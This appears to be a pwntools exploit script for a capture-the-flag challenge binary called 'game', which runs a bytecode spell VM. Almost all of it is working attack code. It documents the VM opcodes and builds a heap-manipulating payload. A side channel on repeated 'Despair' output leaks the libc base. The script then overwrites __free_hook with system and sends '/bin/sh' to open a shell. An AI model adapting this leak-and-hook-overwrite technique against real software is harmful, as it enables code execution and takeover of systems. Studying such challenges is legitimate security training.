from pwn import *
import re

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('game')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc.so.6')
elf = ELF('game')


'''
\x01                                    hero attack
\x02                                    use_weapon then hero attack
    \x00                (only 1 time)       hero->hp = 120000
    \x01                                    hero->hp = min(120000, hero->hp + 50000)
    \x02                                    hero_attack = 4000/5000
    \x03\x03(value)     (only 1 time)       hero->align[0] = value
    \x04                                    boss->align[0] |= 2
\x04(hp_index)                          hp_list[hp_index] = hero->hp
\x06(hp_index)                          hp_list[hp_index] = boss->hp
\x08(hp_index1)(hp_index2)              compare_hp
\x09(size)                              jump
\x0a(size)                              jump if hp_equal
\x0b(size)                              jump if hp_bigger
\x0c(size)                              jump if hp_smaller
\x0d(hp_index)(byte_index)(byte_value)  hp_list[hp_index][byte_index] = byte_value
\x10(hp_index1)(hp_index2)              hp_list[hp_index1] += hp_list[hp_index2]
\x11(alloc_type)(alloc_ptr)             alloc = (alloc_type == 1) ? malloc(alloc_size) : calloc(alloc_size)
\x12                                    free alloc and clear
\x13                                    change boss/flower attack to random number
'''


def big_heal():
    return b'\x02\x00'


def heal():
    return b'\x02\x01'


def attack():
    return b'\x02\x02'


def injury_free():
    return b'\x02\x03\x03\x20'


def padding():
    return b'\x02\x04'


def load_boss_hp(hp_list_index):
    return b'\x06' + p8(hp_list_index)


def cmp(hp_index1, hp_index2):
    return b'\x08' + p8(hp_index1) + p8(hp_index2)


def jmp(size):
    return b'\x09' + p16(size)


def jg(size):
    return b'\x0b' + p16(size)


def set_byte(hp_index, byte_index, byte_value):
    return b'\x0d' + p8(hp_index) + p8(byte_index) + p8(byte_value)


def add(hp_index1, hp_index2):
    return b'\x10' + p8(hp_index1) + p8(hp_index2)


def malloc(size):
    return b'\x11\x01' + p8(size)


def calloc(size):
    return b'\x11\x02' + p8(size)


def free():
    return b'\x12'


def change_boss_attack():
    return b'\x13'


def command_for_debug():
    # b *$rebase(0x1463)
    return b'\x02\x05'


def circle():
    circle1  = heal() * 2
    circle1 += cmp(2, 0)
    circle1 += heal()
    circle1 += attack()
    circle1 += heal()
    circle1 += jg(2 + 3 + 2 + 3)
    circle1 += heal()
    circle1 += add(2, 1)
    circle1 += heal()
    circle1 += jmp(0x10000 - 26)
    circle1 += heal()
    circle1 += padding()
    circle1 += heal()
    return circle1


def pwn():
    payload  = calloc(0xb0)                         # 20000
    payload += heal() * 4                           # 60000
    payload += free()                               # 50000
    payload += injury_free()                        # 1
    payload += big_heal()                           # 20000
    for _ in range(6):                              # 100000
        payload += calloc(0xb0)
        payload += heal()
        payload += free()
    payload += calloc(0xb0)                         # 90000
    payload += heal() * 3                           # 115000
    # have attack 30 times, change to flower
    payload += free()                               # 110000
    payload += malloc(0)                            # 105000
    payload += attack() * 15                        # 30000
    payload += heal() * 2                           # 115000
    payload += change_boss_attack()                 # 115000 - flower_new_attack
    payload += heal()                               # 120000 - flower_new_attack                
    payload += attack()                             # 20000 - flower_new_attack
    # boss come back
    payload += heal() * 2
    # side channel to leak libc_base
    payload += load_boss_hp(0)
    payload += padding()

    for i in range(5, 1, -1):
        payload += set_byte(0, i, 0)
        payload += heal()
        payload += set_byte(1, i, 0)
        payload += heal()
        payload += set_byte(1, i - 1, 1)
        payload += heal()
        payload += circle()
        payload += set_byte(2, i - 1, 0)
        payload += heal()

    payload += change_boss_attack()
    payload += heal()
    payload += free()
    payload += heal()
    payload += malloc(0x18)
    payload += malloc(0x18)
    payload += malloc(0x18)
    payload += free()
    payload += free()
    # payload += command_for_debug()
    io.sendlineafter('Now tell me your spell length:\n', str(len(payload)))
    io.sendafter('Now give me your spell:\n', payload)
    
    
    for _ in range(8):
        io.sendlineafter('what do you want to talk to the dragon?\n', 'aaaa')
    
    io.recvuntil('Reprisal')
    s = io.recvuntil('Reprisal')
    byte4 = len(re.findall(b'Despair', s)) - 2
    s = io.recvuntil('Reprisal')
    byte3 = len(re.findall(b'Despair', s)) - 2
    s = io.recvuntil('Reprisal')
    byte2 = len(re.findall(b'Despair', s)) - 2
    s = io.recvuntil('Reprisal')
    byte1 = len(re.findall(b'Despair', s)) - 2
    log.success('byte4: ' + hex(byte4))
    log.success('byte3: ' + hex(byte3))
    log.success('byte2: ' + hex(byte2))
    log.success('byte1: ' + hex(byte1))
    libc_base = (0x7f << 40) + (byte4 << 32) + (byte3 << 24) + (byte2 << 16) + (byte1 << 8) - libc.sym['__malloc_hook'] - 0x90
    log.success('libc_base: ' + hex(libc_base))
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    io.sendlineafter('what do you want to talk to the dragon?\n', p64(__free_hook - 8))
    io.sendlineafter('what do you want to talk to the dragon?\n', 'aaaa')
    # gdb.attach(io)
    io.sendlineafter('what do you want to talk to the dragon?\n', b'/bin/sh\x00' + p64(system))
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()
